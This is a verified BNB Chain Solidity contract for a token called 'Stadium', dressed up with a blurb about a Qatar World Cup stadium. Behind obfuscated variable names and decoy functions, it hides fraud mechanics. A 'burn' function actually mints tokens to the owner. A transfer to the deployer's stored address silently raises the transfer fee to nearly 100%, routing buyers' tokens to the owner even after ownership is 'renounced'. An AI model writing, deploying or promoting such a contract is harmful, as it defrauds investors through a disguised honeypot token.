/**
 *Submitted for verification at BscScan.com on 2022-11-21
*/

/**

  Al Thumama Stadium is one of the newly built stadiums for the FIFA World Cup 2022 in Qatar.
Construction of the stadium began in 2017 and took over four years. Al Thumama Stadium officially opened on 22 October 2021 with the 
49th Amir Cup Final between Al-Sadd and Al-Rayyan (1-1).

  https://m.facebook.com/profile.php?id=2445029939060227
  https://www.instagram.com/p/Ck--VEfgKdB/?utm_source=ig_embed&utm_campaign=loading
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract Stadium {
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  HPCLKM = 1000000000000000000;
uint256 private  IJVFQG = 1000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  IAFMMM = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  symbol = "Stadium";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => uint256) public balanceOf;
uint256 private  QERPDY = 1000000000000000000;
uint256 private  RSHGFI = 100000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  GZUIGE = 10000000000;
address private  VAIVEN = address(0);
address private  MMEPCY = address(0);
address private  QBRQHM = address(0);
uint256 public constant MJZBAB = 99999;
uint256 private  OBCKXI = 10000000000000;
address private  PZCYTB = address(0);
uint8 public constant decimals = 18;
uint256 private  FRGWLX = 1000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public owner;
string public  name = "Stadium";
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () public {
PZCYTB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getQERPDY() private returns (uint256) {
return QERPDY;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getGZUIGE() private returns (uint256) {
return GZUIGE;
}

function _getOBCKXI() private returns (uint256) {
return OBCKXI;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tWUOPOS 0");
require(spender != address(0), "fWUOPOS 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getFRGWLX() private returns (uint256) {
return FRGWLX;
}

function _getQBRQHM() private returns (address) {
return QBRQHM;
}

function _getRSHGFI() private returns (uint256) {
return RSHGFI;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getMMEPCY() private returns (address) {
return MMEPCY;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "WUOPOS");
require(to != address(0), "WUOPOS");
require(amount <= balanceOf[from], "WUOPOS");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* MJZBAB/HPCLKM ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==PZCYTB){
HPCLKM = MJZBAB+2;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getVAIVEN() private returns (address) {
return VAIVEN;
}

function _getIAFMMM() private returns (address) {
return IAFMMM;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getIJVFQG() private returns (uint256) {
return IJVFQG;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

}